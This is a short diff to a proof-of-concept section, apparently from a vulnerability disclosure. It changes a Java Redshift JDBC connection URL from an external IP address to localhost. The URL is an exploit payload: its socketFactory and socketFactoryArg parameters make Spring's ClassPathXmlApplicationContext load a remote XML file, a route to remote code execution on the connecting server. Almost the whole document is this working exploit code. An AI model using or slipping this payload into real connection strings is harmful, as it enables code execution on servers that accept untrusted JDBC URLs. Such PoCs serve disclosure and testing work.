@@ -1,7 +1,7 @@
 ## poc
 ```java
 String driver = "com.amazon.redshift.jdbc.Driver";
-String url = "jdbc:redshift://64.64.232.159:3306/mysql?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:9999/1.xml";
+String url = "jdbc:redshift://localhost:3306/mysql?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:9999/1.xml";
 Class.forName(driver);
 Connection conn = DriverManager.getConnection(url);
 ```
